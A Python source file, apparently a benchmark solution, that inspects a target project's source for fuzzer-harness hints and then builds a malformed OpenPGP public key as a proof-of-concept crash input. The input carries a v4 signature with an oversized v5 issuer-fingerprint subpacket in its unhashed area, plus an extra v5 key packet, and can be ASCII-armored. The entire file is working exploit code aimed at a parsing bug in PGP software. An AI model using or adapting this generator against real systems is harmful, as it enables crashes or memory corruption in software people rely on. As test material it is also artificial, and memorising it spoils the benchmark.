import os
import re
import tarfile
import base64
from typing import Optional, Tuple, Iterable


def _new_format_len(n: int) -> bytes:
    if n < 0:
        raise ValueError("negative length")
    if n < 192:
        return bytes([n])
    if n <= 8383:
        n2 = n - 192
        return bytes([192 + (n2 >> 8), n2 & 0xFF])
    return b"\xFF" + n.to_bytes(4, "big")


def _pgp_packet(tag: int, body: bytes) -> bytes:
    if not (0 <= tag <= 63):
        raise ValueError("bad tag")
    hdr = bytes([0xC0 | tag]) + _new_format_len(len(body))
    return hdr + body


def _u16be(n: int) -> bytes:
    return bytes([(n >> 8) & 0xFF, n & 0xFF])


def _u32be(n: int) -> bytes:
    return bytes([(n >> 24) & 0xFF, (n >> 16) & 0xFF, (n >> 8) & 0xFF, n & 0xFF])


def _mpi_from_bits_and_bytes(bitlen: int, data: bytes) -> bytes:
    return _u16be(bitlen) + data


def _mpi_from_int(n: int) -> bytes:
    if n < 0:
        raise ValueError("negative mpi")
    if n == 0:
        return b"\x00\x00"
    bitlen = n.bit_length()
    bytelen = (bitlen + 7) // 8
    return _u16be(bitlen) + n.to_bytes(bytelen, "big")


def _sig_subpacket(sp_type: int, sp_data: bytes) -> bytes:
    ln = 1 + len(sp_data)
    return _new_format_len(ln) + bytes([sp_type & 0x7F]) + sp_data


def _crc24(data: bytes) -> int:
    crc = 0xB704CE
    poly = 0x1864CFB
    for b in data:
        crc ^= b << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= poly
    return crc & 0xFFFFFF


def _armor_public_key(binary: bytes) -> bytes:
    b64 = base64.b64encode(binary).decode("ascii")
    lines = [b64[i:i + 64] for i in range(0, len(b64), 64)]
    crc = _crc24(binary)
    crc_b64 = base64.b64encode(crc.to_bytes(3, "big")).decode("ascii")
    out = []
    out.append("-----BEGIN PGP PUBLIC KEY BLOCK-----\n")
    out.append("\n")
    out.extend(line + "\n" for line in lines)
    out.append("=" + crc_b64 + "\n")
    out.append("-----END PGP PUBLIC KEY BLOCK-----\n")
    return "".join(out).encode("ascii")


def _iter_source_texts_from_tar(src_path: str) -> Iterable[Tuple[str, str]]:
    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                lname = name.lower()
                if not lname.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".rs", ".go", ".java", ".py")):
                    continue
                if m.size <= 0 or m.size > 1_500_000:
                    continue
                f = tf.extractfile(m)
                if not f:
                    continue
                data = f.read()
                try:
                    text = data.decode("utf-8", "ignore")
                except Exception:
                    continue
                yield name, text
    except Exception:
        return


def _iter_source_texts_from_dir(src_dir: str) -> Iterable[Tuple[str, str]]:
    for root, _, files in os.walk(src_dir):
        for fn in files:
            lname = fn.lower()
            if not lname.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".rs", ".go", ".java", ".py")):
                continue
            path = os.path.join(root, fn)
            try:
                st = os.stat(path)
                if st.st_size <= 0 or st.st_size > 1_500_000:
                    continue
                with open(path, "rb") as f:
                    data = f.read()
                text = data.decode("utf-8", "ignore")
                yield path, text
            except Exception:
                continue


def _detect_hints(src_path: str) -> Tuple[bool, int]:
    armor_hint = False
    issuer_fpr_type = 33

    def update_from_text(text: str) -> None:
        nonlocal armor_hint, issuer_fpr_type
        if "LLVMFuzzerTestOneInput" in text:
            if re.search(r"\bdearmor\b|BEGIN PGP|PGP (PUBLIC|PRIVATE) KEY BLOCK|\barmou?r\b", text, re.IGNORECASE):
                armor_hint = True

        if issuer_fpr_type == 33:
            for m in re.finditer(r"^\s*#\s*define\s+([A-Za-z_0-9]*ISSUER[A-Za-z_0-9]*(?:FPR|FINGERPRINT)[A-Za-z_0-9]*)\s+(\d+)\b",
                                 text, re.MULTILINE):
                try:
                    val = int(m.group(2))
                    if 1 <= val <= 127:
                        issuer_fpr_type = val
                        break
                except Exception:
                    pass

    if os.path.isdir(src_path):
        for _, text in _iter_source_texts_from_dir(src_path):
            update_from_text(text)
            if armor_hint and issuer_fpr_type != 33:
                break
    else:
        for _, text in _iter_source_texts_from_tar(src_path):
            update_from_text(text)
            if armor_hint and issuer_fpr_type != 33:
                break

    return armor_hint, issuer_fpr_type


def _build_poc_binary(issuer_fpr_type: int) -> bytes:
    # V4 RSA public key packet
    n_data = b"\x80" + b"\x00" * 127  # 1024-bit: only top bit set
    n_mpi = _mpi_from_bits_and_bytes(1024, n_data)
    e_mpi = _mpi_from_int(65537)
    pubkey_v4_body = bytes([4]) + _u32be(0) + bytes([1]) + n_mpi + e_mpi
    pubkey_v4 = _pgp_packet(6, pubkey_v4_body)

    # User ID packet
    userid = _pgp_packet(13, b"a")

    # Signature packet (v4), with v5 issuer fingerprint subpacket (32 bytes) in UNHASHED area.
    creation_time_sp = _sig_subpacket(2, _u32be(0))
    issuer_fp_bytes = bytes([5]) + (b"F" * 32)
    issuer_fpr_sp = _sig_subpacket(int(issuer_fpr_type), issuer_fp_bytes)

    sig_version = 4
    sig_type = 0x13  # positive certification of a User ID and Public-Key packet
    pk_alg = 1       # RSA
    hash_alg = 2     # SHA-1 (arbitrary)

    hashed = creation_time_sp
    unhashed = issuer_fpr_sp

    sig_body = bytes([sig_version, sig_type, pk_alg, hash_alg])
    sig_body += _u16be(len(hashed)) + hashed
    sig_body += _u16be(len(unhashed)) + unhashed
    sig_body += b"\x00\x00"  # left 16 bits of hash
    sig_body += _mpi_from_int(1)  # signature MPI (minimal)

    sig_pkt = _pgp_packet(2, sig_body)

    # Append a valid-looking v5 RSA public key packet too (in case the bug triggers via v5 fingerprint handling).
    keymat = n_mpi + e_mpi
    pubkey_v5_body = bytes([5]) + _u32be(0) + bytes([1]) + _u32be(len(keymat)) + keymat
    pubkey_v5 = _pgp_packet(6, pubkey_v5_body)

    return pubkey_v4 + userid + sig_pkt + pubkey_v5


class Solution:
    def solve(self, src_path: str) -> bytes:
        armor_hint, issuer_fpr_type = _detect_hints(src_path)
        poc = _build_poc_binary(issuer_fpr_type)
        if armor_hint:
            return _armor_public_key(poc)
        return poc